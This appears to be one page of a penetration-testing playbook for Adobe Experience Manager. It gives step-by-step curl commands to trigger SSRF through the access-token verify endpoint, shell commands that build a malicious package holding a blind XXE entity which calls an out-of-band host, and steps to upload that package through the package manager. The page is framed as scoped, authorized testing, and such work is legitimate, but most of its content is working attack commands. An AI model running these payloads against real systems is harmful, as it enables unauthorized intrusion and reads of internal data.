# Batch 15 — Modern AEM: SSRF + package-manager XXE

## objective

Test two **modern research** primitives (Assetnote/Searchlight):  
1) SSRF via access-token verify  
2) Blind XXE during package upload validation  

No EL/write chains here (that is batch 16).

## estimated_time

60–90 minutes

## prerequisites

- OAST URL  
- Upload/SSRF allowed in scope  
- Dispatcher bypass from earlier if paths 404

## testing_workflow

### 1) Technique A — SSRF endpoint

```bash
T="https://TARGET"
COLLAB="http://YOUR-OAST"

curl -sk -D- -X POST "$T/services/accesstoken/verify" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "auth_url=$COLLAB" | head -40
```

If 404, retry with your **working bypass wrapper** patterns from 04–06 (same path mutations you used for QueryBuilder).

Check collaborator for hit; note if response body reflects fetch output (full-read SSRF).

### 2) Technique B — build minimal evil package (offline)

```bash
mkdir -p /tmp/evilpkg/jcr_root /tmp/evilpkg/META-INF/vault
echo -n > /tmp/evilpkg/jcr_root/empty.txt
cat > /tmp/evilpkg/META-INF/vault/privileges.xml <<EOF
<!DOCTYPE x [<!ENTITY foo SYSTEM "https://YOUR-OAST/xxe">]><x>&foo;</x>
EOF
cd /tmp/evilpkg && zip -r /tmp/evil.zip jcr_root META-INF
```

### 3) Technique C — upload via packmgr if reachable

```bash
curl -sk -o /dev/null -w "packmgr:%{http_code}\n" "$T/crx/packmgr/index.jsp"
# Upload evil.zip via UI or /crx/packmgr/service/exec.json if allowed
# Success metric: OAST callback even when install fails
```

If packmgr auth-walled, document and stop — do not brute admin.

## decision_points

| If… | Then… |
|-----|--------|
| SSRF full read | High impact; optional internal port notes |
| Blind XXE callback only | Still valid; limited exfil expectations |
| Both dead | Continue **16** if write endpoints interesting; else assessment AEM track nearly done |

## expected_findings

- SSRF, blind XXE pre-install validation

## next_batch_to_continue_with

→ **[16-modern-write-el.md](./16-modern-write-el.md)**
